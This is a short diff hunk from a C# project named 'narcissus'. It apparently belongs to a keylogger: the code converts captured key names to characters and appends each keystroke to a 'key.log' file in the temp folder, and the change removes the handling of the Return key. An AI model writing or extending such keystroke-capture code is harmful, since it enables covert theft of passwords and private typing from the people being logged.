@@ -756,9 +756,6 @@ namespace narcissus
             if(printKey == "SPACE")
             {
                 printKey = " ";
-            } else if (printKey == "RETURN")
-            {
-                printKey = "\n";
             }
             File.AppendAllText(Path.GetTempPath() + "key.log",  printKey);
         }
